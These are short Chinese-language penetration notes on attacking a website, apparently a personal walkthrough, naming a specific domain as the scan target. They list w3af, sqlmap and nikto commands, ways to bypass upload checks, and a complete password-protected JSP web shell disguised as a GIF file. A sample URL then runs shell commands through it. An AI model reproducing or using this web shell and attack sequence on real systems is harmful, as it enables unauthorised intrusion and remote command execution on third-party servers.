## sql注入
1. w3af对目标网站进行漏洞扫描
    ponderosa.com.tw

    勾选instructor

    audit：
    - sql
    - backdoor
2. sqlmap

```bash
  sqlmap -u [url] --dbs （输出数据库名称） --dbms mysql -D [dbname] --tables
```

3. nikto
```bash
    nikto --host [domain]
```

    扫描到后台管理网站，输入用户名和密码

4. 找到文件上传功能

  此处找到的是图片上传功能
  假如在前端做了文件验证的话，可以
      - 在f12对js做修改，很轻松的绕过
      - 代理的方式，做拦截做中间人攻击

  假如是判断文件头内容的话，一句话木马，改文件后缀名.gif
```jsp
Gif89a
<% if("023".equals(request.getParameter("pwd"))){ java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("i")).getInputStream(); int a = -1; byte[] b = new byte[2048]; out.print("
<pre>");
        while((a=in.read(b))!=-1){
            out.println(new String(b,0,a));
        }
        out.print("</pre>
");
    }
%>
```
或者抓包，中间人注入改文件头
回显带密码验证，直接执行
```
http://192.168.16.240:8080/Shell/cmd2.jsp?pwd=023&i=ls
```
可以发现，文件都列出来了，其实这里可以用更专业的工具来搞一哈，但是就算了，测试出漏洞就可以了。
